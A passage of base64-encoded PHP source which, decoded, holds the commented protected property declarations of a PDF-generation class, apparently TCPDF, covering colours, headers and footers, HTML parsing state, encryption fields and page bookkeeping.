5nIGNvbG9yLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJERyYXdDb2xvcjsKCgkvKioKCSAqIENvbW1hbmRzIGZvciBmaWxsaW5nIGNvbG9yLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJEZpbGxDb2xvcjsKCgkvKioKCSAqIENvbW1hbmRzIGZvciB0ZXh0IGNvbG9yLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJFRleHRDb2xvcjsKCgkvKioKCSAqIEluZGljYXRlcyB3aGV0aGVyIGZpbGwgYW5kIHRleHQgY29sb3JzIGFyZSBkaWZmZXJlbnQuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkQ29sb3JGbGFnOwoKCS8qKgoJICogQXV0b21hdGljIHBhZ2UgYnJlYWtpbmcuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkQXV0b1BhZ2VCcmVhazsKCgkvKioKCSAqIFRocmVzaG9sZCB1c2VkIHRvIHRyaWdnZXIgcGFnZSBicmVha3MuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkUGFnZUJyZWFrVHJpZ2dlcjsKCgkvKioKCSAqIEZsYWcgc2V0IHdoZW4gcHJvY2Vzc2luZyBwYWdlIGhlYWRlci4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRJbkhlYWRlciA9IGZhbHNlOwoKCS8qKgoJICogRmxhZyBzZXQgd2hlbiBwcm9jZXNzaW5nIHBhZ2UgZm9vdGVyLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJEluRm9vdGVyID0gZmFsc2U7CgoJLyoqCgkgKiBab29tIGRpc3BsYXkgbW9kZS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRab29tTW9kZTsKCgkvKioKCSAqIExheW91dCBkaXNwbGF5IG1vZGUuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkTGF5b3V0TW9kZTsKCgkvKioKCSAqIElmIHRydWUgc2V0IHRoZSBkb2N1bWVudCBpbmZvcm1hdGlvbiBkaWN0aW9uYXJ5IGluIFVuaWNvZGUuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkZG9jaW5mb3VuaWNvZGUgPSB0cnVlOwoKCS8qKgoJICogRG9jdW1lbnQgdGl0bGUuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkdGl0bGUgPSAnJzsKCgkvKioKCSAqIERvY3VtZW50IHN1YmplY3QuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkc3ViamVjdCA9ICcnOwoKCS8qKgoJICogRG9jdW1lbnQgYXV0aG9yLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGF1dGhvciA9ICcnOwoKCS8qKgoJICogRG9jdW1lbnQga2V5d29yZHMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAka2V5d29yZHMgPSAnJzsKCgkvKioKCSAqIERvY3VtZW50IGNyZWF0b3IuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkY3JlYXRvciA9ICcnOwoKCS8qKgoJICogU3RhcnRpbmcgcGFnZSBudW1iZXIuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkc3RhcnRpbmdfcGFnZV9udW1iZXIgPSAxOwoKCS8qKgoJICogVGhlIHJpZ2h0LWJvdHRvbSAob3IgbGVmdC1ib3R0b20gZm9yIFJUTCkgY29ybmVyIFggY29vcmRpbmF0ZSBvZiBsYXN0IGluc2VydGVkIGltYWdlLgoJICogQHNpbmNlIDIwMDItMDctMzEKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkaW1nX3JiX3g7CgoJLyoqCgkgKiBUaGUgcmlnaHQtYm90dG9tIGNvcm5lciBZIGNvb3JkaW5hdGUgb2YgbGFzdCBpbnNlcnRlZCBpbWFnZS4KCSAqIEBzaW5jZSAyMDAyLTA3LTMxCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGltZ19yYl95OwoKCS8qKgoJICogQWRqdXN0aW5nIGZhY3RvciB0byBjb252ZXJ0IHBpeGVscyB0byB1c2VyIHVuaXRzLgoJICogQHNpbmNlIDIwMDQtMDYtMTQKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkaW1nc2NhbGUgPSAxOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnIHNldCB0byB0cnVlIHdoZW4gdGhlIGlucHV0IHRleHQgaXMgdW5pY29kZSAocmVxdWlyZSB1bmljb2RlIGZvbnRzKS4KCSAqIEBzaW5jZSAyMDA1LTAxLTAyCgkgKiBAYXV0aG9yIE5pY29sYSBBc3VuaQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGlzdW5pY29kZSA9IGZhbHNlOwoKCS8qKgoJICogUERGIHZlcnNpb24uCgkgKiBAc2luY2UgMS41LjMKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRQREZWZXJzaW9uID0gJzEuNyc7CgoJLyoqCgkgKiBJRCBvZiB0aGUgc3RvcmVkIGRlZmF1bHQgaGVhZGVyIHRlbXBsYXRlICgtMSA9IG5vdCBzZXQpLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGhlYWRlcl94b2JqaWQgPSBmYWxzZTsKCgkvKioKCSAqIElmIHRydWUgcmVzZXQgdGhlIEhlYWRlciBYb2JqZWN0IHRlbXBsYXRlIGF0IGVhY2ggcGFnZQoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGhlYWRlcl94b2JqX2F1dG9yZXNldCA9IGZhbHNlOwoKCS8qKgoJICogTWluaW11bSBkaXN0YW5jZSBiZXR3ZWVuIGhlYWRlciBhbmQgdG9wIHBhZ2UgbWFyZ2luLgoJICogQHByb3RlY3RlZAoJICogQHZhciBmbG9hdAoJICovCglwcm90ZWN0ZWQgJGhlYWRlcl9tYXJnaW47CgoJLyoqCgkgKiBNaW5pbXVtIGRpc3RhbmNlIGJldHdlZW4gZm9vdGVyIGFuZCBib3R0b20gcGFnZSBtYXJnaW4uCgkgKiBAcHJvdGVjdGVkCgkgKiBAdmFyIGZsb2F0CgkgKi8KCXByb3RlY3RlZCAkZm9vdGVyX21hcmdpbjsKCgkvKioKCSAqIE9yaWdpbmFsIGxlZnQgbWFyZ2luIHZhbHVlLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDEuNTMuMC5UQzAxMwoJICovCglwcm90ZWN0ZWQgJG9yaWdpbmFsX2xNYXJnaW47CgoJLyoqCgkgKiBPcmlnaW5hbCByaWdodCBtYXJnaW4gdmFsdWUuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMS41My4wLlRDMDEzCgkgKi8KCXByb3RlY3RlZCAkb3JpZ2luYWxfck1hcmdpbjsKCgkvKioKCSAqIERlZmF1bHQgZm9udCB1c2VkIG9uIHBhZ2UgaGVhZGVyLgoJICogQHByb3RlY3RlZAoJICogQHZhciBhcnJheTxpbnQsc3RyaW5nfGZsb2F0fG51bGw+CgkgKiBAcGhwc3Rhbi12YXIgYXJyYXl7MDogc3RyaW5nLCAxOiBzdHJpbmcsIDI6IGZsb2F0fG51bGx9CgkgKi8KCXByb3RlY3RlZCAkaGVhZGVyX2ZvbnQ7CgoJLyoqCgkgKiBEZWZhdWx0IGZvbnQgdXNlZCBvbiBwYWdlIGZvb3Rlci4KCSAqIEBwcm90ZWN0ZWQKCSAqIEB2YXIgYXJyYXk8aW50LHN0cmluZ3xmbG9hdHxudWxsPgoJICogQHBocHN0YW4tdmFyIGFycmF5ezA6IHN0cmluZywgMTogc3RyaW5nLCAyOiBmbG9hdHxudWxsfQoJICovCglwcm90ZWN0ZWQgJGZvb3Rlcl9mb250OwoKCS8qKgoJICogTGFuZ3VhZ2UgdGVtcGxhdGVzLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGw7CgoJLyoqCgkgKiBCYXJjb2RlIHRvIHByaW50IG9uIHBhZ2UgZm9vdGVyIChvbmx5IGlmIHNldCkuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkYmFyY29kZSA9IGZhbHNlOwoKCS8qKgoJICogQm9vbGVhbiBmbGFnIHRvIHByaW50L2hpZGUgcGFnZSBoZWFkZXIuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkcHJpbnRfaGVhZGVyID0gdHJ1ZTsKCgkvKioKCSAqIEJvb2xlYW4gZmxhZyB0byBwcmludC9oaWRlIHBhZ2UgZm9vdGVyLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJHByaW50X2Zvb3RlciA9IHRydWU7CgoJLyoqCgkgKiBIZWFkZXIgaW1hZ2UgbG9nby4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRoZWFkZXJfbG9nbyA9ICcnOwoKCS8qKgoJICogV2lkdGggb2YgaGVhZGVyIGltYWdlIGxvZ28gaW4gdXNlciB1bml0cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRoZWFkZXJfbG9nb193aWR0aCA9IDMwOwoKCS8qKgoJICogVGl0bGUgdG8gYmUgcHJpbnRlZCBvbiBkZWZhdWx0IHBhZ2UgaGVhZGVyLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGhlYWRlcl90aXRsZSA9ICcnOwoKCS8qKgoJICogU3RyaW5nIHRvIHByaW50IG9uIHBhZ2UgaGVhZGVyIGFmdGVyIHRpdGxlLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGhlYWRlcl9zdHJpbmcgPSAnJzsKCgkvKioKCSAqIENvbG9yIGZvciBoZWFkZXIgdGV4dCAoUkdCIGFycmF5KS4KCSAqIEBzaW5jZSA1LjkuMTc0ICgyMDEyLTA3LTI1KQoJICogQHByb3RlY3RlZAoJICogQHZhciBpbnRbXQoJICogQHBocHN0YW4tdmFyIGFycmF5ezA6IGludCwgMTogaW50LCAyOiBpbnR9CgkgKi8KCXByb3RlY3RlZCAkaGVhZGVyX3RleHRfY29sb3IgPSBhcnJheSgwLDAsMCk7CgoJLyoqCgkgKiBDb2xvciBmb3IgaGVhZGVyIGxpbmUgKFJHQiBhcnJheSkuCgkgKiBAc2luY2UgNS45LjE3NCAoMjAxMi0wNy0yNSkKCSAqIEBwcm90ZWN0ZWQKCSAqIEB2YXIgaW50W10KCSAqIEBwaHBzdGFuLXZhciBhcnJheXswOiBpbnQsIDE6IGludCwgMjogaW50fQoJICovCglwcm90ZWN0ZWQgJGhlYWRlcl9saW5lX2NvbG9yID0gYXJyYXkoMCwwLDApOwoKCS8qKgoJICogQ29sb3IgZm9yIGZvb3RlciB0ZXh0IChSR0IgYXJyYXkpLgoJICogQHNpbmNlIDUuOS4xNzQgKDIwMTItMDctMjUpCgkgKiBAcHJvdGVjdGVkCgkgKiBAdmFyIGludFtdCgkgKiBAcGhwc3Rhbi12YXIgYXJyYXl7MDogaW50LCAxOiBpbnQsIDI6IGludH0KCSAqLwoJcHJvdGVjdGVkICRmb290ZXJfdGV4dF9jb2xvciA9IGFycmF5KDAsMCwwKTsKCgkvKioKCSAqIENvbG9yIGZvciBmb290ZXIgbGluZSAoUkdCIGFycmF5KS4KCSAqIEBzaW5jZSA1LjkuMTc0ICgyMDEyLTA3LTI1KQoJICogQHByb3RlY3RlZAoJICogQHZhciBpbnRbXQoJICogQHBocHN0YW4tdmFyIGFycmF5ezA6IGludCwgMTogaW50LCAyOiBpbnR9CgkgKi8KCXByb3RlY3RlZCAkZm9vdGVyX2xpbmVfY29sb3IgPSBhcnJheSgwLDAsMCk7CgoJLyoqCgkgKiBUZXh0IHNoYWRvdyBkYXRhIGFycmF5LgoJICogQHNpbmNlIDUuOS4xNzQgKDIwMTItMDctMjUpCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkdHh0c2hhZG93ID0gYXJyYXkoJ2VuYWJsZWQnPT5mYWxzZSwgJ2RlcHRoX3cnPT4wLCAnZGVwdGhfaCc9PjAsICdjb2xvcic9PmZhbHNlLCAnb3BhY2l0eSc9PjEsICdibGVuZF9tb2RlJz0+J05vcm1hbCcpOwoKCS8qKgoJICogRGVmYXVsdCBudW1iZXIgb2YgY29sdW1ucyBmb3IgaHRtbCB0YWJsZS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRkZWZhdWx0X3RhYmxlX2NvbHVtbnMgPSA0OwoKCS8vIHZhcmlhYmxlcyBmb3IgaHRtbCBwYXJzZXIKCgkvKioKCSAqIEhUTUwgUEFSU0VSOiBhcnJheSB0byBzdG9yZSBjdXJyZW50IGxpbmsgYW5kIHJlbmRlcmluZyBzdHlsZXMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkSFJFRiA9IGFycmF5KCk7CgoJLyoqCgkgKiBMaXN0IG9mIGF2YWlsYWJsZSBmb250cyBvbiBmaWxlc3lzdGVtLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGZvbnRsaXN0ID0gYXJyYXkoKTsKCgkvKioKCSAqIEN1cnJlbnQgZm9yZWdyb3VuZCBjb2xvci4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRmZ2NvbG9yOwoKCS8qKgoJICogSFRNTCBQQVJTRVI6IGFycmF5IG9mIGJvb2xlYW4gdmFsdWVzLCB0cnVlIGluIGNhc2Ugb2Ygb3JkZXJlZCBsaXN0IChPTCksIGZhbHNlIG90aGVyd2lzZS4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRsaXN0b3JkZXJlZCA9IGFycmF5KCk7CgoJLyoqCgkgKiBIVE1MIFBBUlNFUjogYXJyYXkgY291bnQgbGlzdCBpdGVtcyBvbiBuZXN0ZWQgbGlzdHMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkbGlzdGNvdW50ID0gYXJyYXkoKTsKCgkvKioKCSAqIEhUTUwgUEFSU0VSOiBjdXJyZW50IGxpc3QgbmVzdGluZyBsZXZlbC4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRsaXN0bnVtID0gMDsKCgkvKioKCSAqIEhUTUwgUEFSU0VSOiBpbmRlbnQgYW1vdW50IGZvciBsaXN0cy4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRsaXN0aW5kZW50ID0gMDsKCgkvKioKCSAqIEhUTUwgUEFSU0VSOiBjdXJyZW50IGxpc3QgaW5kZW50ZW50YXRpb24gbGV2ZWwuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkbGlzdGluZGVudGxldmVsID0gMDsKCgkvKioKCSAqIEN1cnJlbnQgYmFja2dyb3VuZCBjb2xvci4KCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkICRiZ2NvbG9yOwoKCS8qKgoJICogVGVtcG9yYXJ5IGZvbnQgc2l6ZSBpbiBwb2ludHMuCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCAkdGVtcGZvbnRzaXplID0gMTA7CgoJLyoqCgkgKiBTcGFjZXIgc3RyaW5nIGZvciBMSSB0YWdzLgoJICogQHByb3RlY3RlZAoJICovCglwcm90ZWN0ZWQgJGxpc3BhY2VyID0gJyc7CgoJLyoqCgkgKiBEZWZhdWx0IGVuY29kaW5nLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDEuNTMuMC5UQzAxMAoJICovCglwcm90ZWN0ZWQgJGVuY29kaW5nID0gJ1VURi04JzsKCgkvKioKCSAqIEJvb2xlYW4gZmxhZyB0byBpbmRpY2F0ZSBpZiB0aGUgZG9jdW1lbnQgbGFuZ3VhZ2UgaXMgUmlnaHQtVG8tTGVmdC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjAuMDAwCgkgKi8KCXByb3RlY3RlZCAkcnRsID0gZmFsc2U7CgoJLyoqCgkgKiBCb29sZWFuIGZsYWcgdXNlZCB0byBmb3JjZSBSVEwgb3IgTFRSIHN0cmluZyBkaXJlY3Rpb24uCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMi4wLjAwMAoJICovCglwcm90ZWN0ZWQgJHRtcHJ0bCA9IGZhbHNlOwoKCS8vIC0tLSBWYXJpYWJsZXMgdXNlZCBmb3IgZG9jdW1lbnQgZW5jcnlwdGlvbjoKCgkvKioKCSAqIElCb29sZWFuIGZsYWcgaW5kaWNhdGluZyB3aGV0aGVyIGRvY3VtZW50IGlzIHByb3RlY3RlZC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjAuMDAwICgyMDA4LTAxLTAyKQoJICovCglwcm90ZWN0ZWQgJGVuY3J5cHRlZDsKCgkvKioKCSAqIEFycmF5IGNvbnRhaW5pbmcgZW5jcnlwdGlvbiBzZXR0aW5ncy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjAuMDA1ICgyMDEwLTA1LTExKQoJICovCglwcm90ZWN0ZWQgJGVuY3J5cHRkYXRhID0gYXJyYXkoKTsKCgkvKioKCSAqIExhc3QgUkM0IGtleSBlbmNyeXB0ZWQgKGNhY2hlZCBmb3Igb3B0aW1pc2F0aW9uKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjAuMDAwICgyMDA4LTAxLTAyKQoJICovCglwcm90ZWN0ZWQgJGxhc3RfZW5jX2tleTsKCgkvKioKCSAqIExhc3QgUkM0IGNvbXB1dGVkIGtleS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjAuMDAwICgyMDA4LTAxLTAyKQoJICovCglwcm90ZWN0ZWQgJGxhc3RfZW5jX2tleV9jOwoKCS8qKgoJICogRmlsZSBJRCAodXNlZCBvbiBkb2N1bWVudCB0cmFpbGVyKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjAuMDA1ICgyMDEwLTA1LTEyKQoJICovCglwcm90ZWN0ZWQgJGZpbGVfaWQ7CgoJLyoqCgkgKiBJbnRlcm5hbCBzZWNyZXQgdXNlZCB0byBlbmNyeXB0IGRhdGEuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNi43LjUgKDIwMjQtMDMtMjEpCgkgKi8KCXByb3RlY3RlZCAkaGFzaF9rZXk7CgoJLy8gLS0tIGJvb2ttYXJrIC0tLQoKCS8qKgoJICogT3V0bGluZXMgZm9yIGJvb2ttYXJrLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXByb3RlY3RlZCAkb3V0bGluZXMgPSBhcnJheSgpOwoKCS8qKgoJICogT3V0bGluZSByb290IGZvciBib29rbWFyay4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAyLjEuMDAyICgyMDA4LTAyLTEyKQoJICovCglwcm90ZWN0ZWQgJE91dGxpbmVSb290OwoKCS8vIC0tLSBqYXZhc2NyaXB0IGFuZCBmb3JtIC0tLQoKCS8qKgoJICogSmF2YXNjcmlwdCBjb2RlLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXByb3RlY3RlZCAkamF2YXNjcmlwdCA9ICcnOwoKCS8qKgoJICogSmF2YXNjcmlwdCBjb3VudGVyLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuMS4wMDIgKDIwMDgtMDItMTIpCgkgKi8KCXByb3RlY3RlZCAkbl9qczsKCgkvKioKCSAqIGxpbmUgdGhyb3VnaCBzdGF0ZQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDIuOC4wMDAgKDIwMDgtMDMtMTkpCgkgKi8KCXByb3RlY3RlZCAkbGluZXRocm91Z2g7CgoJLyoqCgkgKiBBcnJheSB3aXRoIGFkZGl0aW9uYWwgZG9jdW1lbnQtd2lkZSB1c2FnZSByaWdodHMgZm9yIHRoZSBkb2N1bWVudC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjguMDE0ICgyMDEwLTA4LTIzKQoJICovCglwcm90ZWN0ZWQgJHVyID0gYXJyYXkoKTsKCgkvKioKCSAqIERQSSAoRG90IFBlciBJbmNoKSBEb2N1bWVudCBSZXNvbHV0aW9uIChkbyBub3QgY2hhbmdlKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjAuMDAwICgyMDA4LTAzLTI3KQoJICovCglwcm90ZWN0ZWQgJGRwaSA9IDcyOwoKCS8qKgoJICogQXJyYXkgb2YgcGFnZSBudW1iZXJzIHdlcmUgYSBuZXcgcGFnZSBncm91cCB3YXMgc3RhcnRlZCAodGhlIHBhZ2UgbnVtYmVycyBhcmUgdGhlIGtleXMgb2YgdGhlIGFycmF5KS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjAuMDAwICgyMDA4LTAzLTI3KQoJICovCglwcm90ZWN0ZWQgJG5ld3BhZ2Vncm91cCA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSB0aGF0IGNvbnRhaW5zIHRoZSBudW1iZXIgb2YgcGFnZXMgaW4gZWFjaCBwYWdlIGdyb3VwLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMC4wMDAgKDIwMDgtMDMtMjcpCgkgKi8KCXByb3RlY3RlZCAkcGFnZWdyb3VwcyA9IGFycmF5KCk7CgoJLyoqCgkgKiBDdXJyZW50IHBhZ2UgZ3JvdXAgbnVtYmVyLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMC4wMDAgKDIwMDgtMDMtMjcpCgkgKi8KCXByb3RlY3RlZCAkY3VycnBhZ2Vncm91cCA9IDA7CgoJLyoqCgkgKiBBcnJheSBvZiB0cmFuc3BhcmVuY3kgb2JqZWN0cyBhbmQgcGFyYW1ldGVycy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjAuMDAwICgyMDA4LTAzLTI3KQoJICovCglwcm90ZWN0ZWQgJGV4dGdzdGF0ZXM7CgoJLyoqCgkgKiBTZXQgdGhlIGRlZmF1bHQgSlBFRyBjb21wcmVzc2lvbiBxdWFsaXR5ICgxLTEwMCkuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMy4wLjAwMCAoMjAwOC0wMy0yNykKCSAqLwoJcHJvdGVjdGVkICRqcGVnX3F1YWxpdHk7CgoJLyoqCgkgKiBEZWZhdWx0IGNlbGwgaGVpZ2h0IHJhdGlvLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMC4wMTQgKDIwMDgtMDUtMjMpCgkgKiBAdmFyIGZsb2F0CgkgKi8KCXByb3RlY3RlZCAkY2VsbF9oZWlnaHRfcmF0aW8gPSBLX0NFTExfSEVJR0hUX1JBVElPOwoKCS8qKgoJICogUERGIHZpZXdlciBwcmVmZXJlbmNlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTA5KQoJICovCglwcm90ZWN0ZWQgJHZpZXdlcl9wcmVmZXJlbmNlczsKCgkvKioKCSAqIEEgbmFtZSBvYmplY3Qgc3BlY2lmeWluZyBob3cgdGhlIGRvY3VtZW50IHNob3VsZCBiZSBkaXNwbGF5ZWQgd2hlbiBvcGVuZWQuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqLwoJcHJvdGVjdGVkICRQYWdlTW9kZTsKCgkvKioKCSAqIEFycmF5IGZvciBzdG9yaW5nIGdyYWRpZW50IGluZm9ybWF0aW9uLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDMuMS4wMDAgKDIwMDgtMDYtMDkpCgkgKi8KCXByb3RlY3RlZCAkZ3JhZGllbnRzID0gYXJyYXkoKTsKCgkvKioKCSAqIEFycmF5IHVzZWQgdG8gc3RvcmUgcG9zaXRpb25zIGluc2lkZSB0aGUgcGFnZXMgYnVmZmVyIChrZXlzIGFyZSB0aGUgcGFnZSBudW1iZXJzKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjIuMDAwICgyMDA4LTA2LTI2KQoJICovCglwcm90ZWN0ZWQgJGludG1yayA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSB1c2VkIHRvIHN0b3JlIHBvc2l0aW9ucyBpbnNpZGUgdGhlIHBhZ2VzIGJ1ZmZlciAoa2V5cyBhcmUgdGhlIHBhZ2UgbnVtYmVycykuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS43LjAwMCAoMjAxMC0wOC0wMykKCSAqLwoJcHJvdGVjdGVkICRib3JkZXJtcmsgPSBhcnJheSgpOwoKCS8qKgoJICogQXJyYXkgdXNlZCB0byBzdG9yZSBwYWdlIHBvc2l0aW9ucyB0byB0cmFjayBlbXB0eSBwYWdlcyAoa2V5cyBhcmUgdGhlIHBhZ2UgbnVtYmVycykuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS44LjAwNyAoMjAxMC0wOC0xOCkKCSAqLwoJcHJvdGVjdGVkICRlbXB0eXBhZ2VtcmsgPSBhcnJheSgpOwoKCS8qKgoJICogQXJyYXkgdXNlZCB0byBzdG9yZSBjb250ZW50IHBvc2l0aW9ucyBpbnNpZGUgdGhlIHBhZ2VzIGJ1ZmZlciAoa2V5cyBhcmUgdGhlIHBhZ2UgbnVtYmVycykuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC42LjAyMSAoMjAwOS0wNy0yMCkKCSAqLwoJcHJvdGVjdGVkICRjbnRtcmsgPSBhcnJheSgpOwoKCS8qKgoJICogQXJyYXkgdXNlZCB0byBzdG9yZSBmb290ZXIgcG9zaXRpb25zIG9mIGVhY2ggcGFnZS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSAzLjIuMDAwICgyMDA4LTA3LTAxKQoJICovCglwcm90ZWN0ZWQgJGZvb3RlcnBvcyA9IGFycmF5KCk7CgoJLyoqCgkgKiBBcnJheSB1c2VkIHRvIHN0b3JlIGZvb3RlciBsZW5ndGggb2YgZWFjaCBwYWdlLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMC4wMTQgKDIwMDgtMDctMjkpCgkgKi8KCXByb3RlY3RlZCAkZm9vdGVybGVuID0gYXJyYXkoKTsKCgkvKioKCSAqIEJvb2xlYW4gZmxhZyB0byBpbmRpY2F0ZSBpZiBhIG5ldyBsaW5lIGlzIGNyZWF0ZWQuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMy4yLjAwMCAoMjAwOC0wNy0wMSkKCSAqLwoJcHJvdGVjdGVkICRuZXdsaW5lID0gdHJ1ZTsKCgkvKioKCSAqIEVuZCBwb3NpdGlvbiBvZiB0aGUgbGF0ZXN0IGluc2VydGVkIGxpbmUuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgMy4yLjAwMCAoMjAwOC0wNy0wMSkKCSAqLwoJcHJvdGVjdGVkICRlbmRsaW5leCA9IDA7CgoJLyoqCgkgKiBQREYgc3RyaW5nIGZvciB3aWR0aCB2YWx1ZSBvZiB0aGUgbGFzdCBsaW5lLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMC4wMDYgKDIwMDgtMDctMTYpCgkgKi8KCXByb3RlY3RlZCAkbGluZXN0eWxlV2lkdGggPSAnJzsKCgkvKioKCSAqIFBERiBzdHJpbmcgZm9yIENBUCB2YWx1ZSBvZiB0aGUgbGFzdCBsaW5lLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuMC4wMDYgKDIwMDgtMDctMTYpCgkgKi8KCXByb3RlY3RlZCAkbGluZXN0eWxlQ2FwID0gJzAgSic7CgoJLyoqCgkgKiBQREYgc3RyaW5nIGZvciBqb2luIHZhbHVlIG9mIHRoZSBsYXN0IGxpbmUuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4wLjAwNiAoMjAwOC0wNy0xNikKCSAqLwoJcHJvdGVjdGVkICRsaW5lc3R5bGVKb2luID0gJzAgaic7CgoJLyoqCgkgKiBQREYgc3RyaW5nIGZvciBkYXNoIHZhbHVlIG9mIHRoZSBsYXN0IGxpbmUuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNC4wLjAwNiAoMjAwOC0wNy0xNikKCSAqLwoJcHJvdGVjdGVkICRsaW5lc3R5bGVEYXNoID0gJ1tdIDAgZCc7CgoJLyoqCgkgKiBCb29sZWFuIGZsYWcgdG8gaW5kaWNhdGUgaWYgbWFya2VkLWNvbnRlbnQgc2VxdWVuY2UgaXMgb3Blbi4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA0LjAuMDEzICgyMDA4LTA3LTI4KQoJICovCglwcm90ZWN0ZWQgJG9wZW5NYXJrZWRDb250ZW50I